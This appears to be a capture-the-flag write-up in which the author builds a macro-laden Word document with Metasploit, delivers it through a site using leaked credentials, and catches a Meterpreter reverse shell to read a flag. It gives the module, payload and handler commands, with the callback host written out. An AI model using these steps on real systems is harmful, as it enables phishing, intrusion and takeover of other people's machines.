## Phantom

> A Metasploit-based reverse shell attack leveraging a malicious Word macro.

![The Challenge](https://github.com/user-attachments/assets/ac6fa607-8a0b-4a7b-af81-a9981e8bd8f9)

---

### 🛠️ Initial Setup

The first thing that I could think of was using the Metasploit Framework to embed a reverse shell macro inside a Word document

![image](https://github.com/user-attachments/assets/3079d673-f2c5-449d-9f05-f64e593e1462)

```bash
msfconsole
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_tcp
set LHOST=10.10.236.249
set LPORT=8888
show options
exploit
```


---

### 📡 Listener Setup

After that, I set up a listener in another terminal to catch the reverse shell:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=10.10.236.249
set LPORT=8888
exploit
```

![Handler Listener](https://github.com/user-attachments/assets/6cd1a64f-ff35-4873-8831-14730d718a8e)

---

### 🎯 Delivery

I went to the website and logged in with the leaked credentials and sent the malicious .doc file to the target and waited for them to open it.

![Login Page](https://github.com/user-attachments/assets/d469b22b-5251-4d8c-818d-54d5f788d484)
![File Upload](https://github.com/user-attachments/assets/dcf61fba-e9af-4c68-aeac-11f906d76188)

---

### 🕵️‍♂️ Exploitation

Once they did, I hooked a meterpreter session and navigated to the desktop:

```bash
cd c:/users/Administrator/Desktop
ls
cat flag.txt
```

![Meterpreter Session](https://github.com/user-attachments/assets/cf631450-aaf2-4935-a6dd-6234a7e3aaa2)

